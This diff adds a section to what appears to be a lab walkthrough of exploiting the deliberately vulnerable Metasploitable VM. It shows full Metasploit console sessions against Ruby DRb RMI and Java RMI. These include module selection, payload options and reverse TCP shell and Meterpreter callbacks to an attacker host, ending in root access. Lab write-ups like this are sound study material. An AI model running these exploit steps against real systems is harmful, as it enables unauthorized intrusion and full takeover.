@@ -975,3 +975,140 @@ Password:
 Authentication successful
 ...
 ```
+
+### Ruby DRb RMI
+
+Looking at some of the remaining ports, port 8787's Ruby DRb RMI seemed particularly interesting.
+
+```
+8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+```
+
+Therefore, I decided to do a search in Metasploit for the drb service, and found a Linux exploit that seemed promising (`exploit/linux/misc/drb_remote_codeexec`). Running that against the target system led immediately to another fresh shell, with root privileges.
+
+```
+msf > search drb
+Matching Modules
+================
+
+   Name                                                   Disclosure Date  Rank       Description
+   ----                                                   ---------------  ----       -----------
+   exploit/linux/misc/drb_remote_codeexec                 2011-03-23       excellent  Distributed Ruby Remote Code Execution
+   exploit/multi/misc/wireshark_lwres_getaddrbyname       2010-01-27       great      Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow
+   exploit/multi/misc/wireshark_lwres_getaddrbyname_loop  2010-01-27       great      Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow (loop)
+
+
+msf > use exploit/linux/misc/drb_remote_codeexec
+msf exploit(linux/misc/drb_remote_codeexec) > run
+
+[*] Started reverse TCP double handler on 172.16.243.144:4444
+[*] Trying to exploit instance_eval method
+[!] Target is not vulnerable to instance_eval method
+[*] Trying to exploit syscall method
+[!] Target is not vulnerable to syscall method
+[*] Trying to exploit trap method
+[*] Accepted the first client connection...
+[!] Target is not vulnerable to trap method
+[*] Accepted the second client connection...
+[*] Command: echo xRb0HkSAZmhcjkV2;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "xRb0HkSAZmhcjkV2\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 8 opened (172.16.243.144:4444 -> 172.16.243.143:57407) at 2018-03-25 21:17:00 -0400
+
+id
+uid=0(root) gid=0(root)
+hostname
+metasploitable
+```
+
+### Java RMI
+
+Another service that was running, available for exploitation was the Java RMI Registry on port 1099:
+
+```
+1099/tcp  open  java-rmi    Java RMI Registry
+```
+
+Doing a quick search in Metasploit, I was able to find an exploit that looked promising.
+
+```
+msf > search java rmi
+...
+exploit/multi/misc/java_rmi_server                              2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution
+...
+```
+
+Loading this up, and configuring the payload to return to my attacker machine, I was able to exploit the vulnerability and get back a meterpreter session with root privileges.
+
+```
+msf > use exploit/multi/misc/java_rmi_server
+msf exploit(multi/misc/java_rmi_server) > show options
+
+Module options (exploit/multi/misc/java_rmi_server):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   RHOST      172.16.243.143   yes       The target address
+   RPORT      1099             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+msf exploit(multi/misc/java_rmi_server) > set lhost 172.16.243.144
+lhost => 172.16.243.144
+msf exploit(multi/misc/java_rmi_server) > run
+
+[*] Started reverse TCP handler on 172.16.243.144:4444
+[*] 172.16.243.143:1099 - Using URL: http://0.0.0.0:8080/t3sFon2Uy6K
+[*] 172.16.243.143:1099 - Local IP: http://172.16.243.144:8080/t3sFon2Uy6K
+[*] 172.16.243.143:1099 - Server started.
+[*] 172.16.243.143:1099 - Sending RMI Header...
+[*] 172.16.243.143:1099 - Sending RMI Call...
+[*] 172.16.243.143:1099 - Replied to request for payload JAR
+[*] Sending stage (53837 bytes) to 172.16.243.143
+[*] Meterpreter session 9 opened (172.16.243.144:4444 -> 172.16.243.143:48518) at 2018-03-25 21:30:34 -0400
+[-] 172.16.243.143:1099 - Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
+[*] 172.16.243.143:1099 - Server stopped.
+[*] Exploit completed, but no session was created.
+msf exploit(multi/misc/java_rmi_server) > sessions -i 9
+[*] Starting interaction with 9...
+
+meterpreter > id
+[-] Unknown command: id.
+meterpreter > getuid
+Server username: root
+meterpreter > sysinfo
+Computer    : metasploitable
+OS          : Linux 2.6.24-16-server (i386)
+Meterpreter : java/linux
+meterpreter > shell
+Process 1 created.
+```
+
+## Wrapping Up
+
+At this point, I wrapped up for my afternoon of exploitation. I had made by way through most of the service exploitations, though I really hadn't tackled the web server exploitation. Perhaps I attack that in a future article.
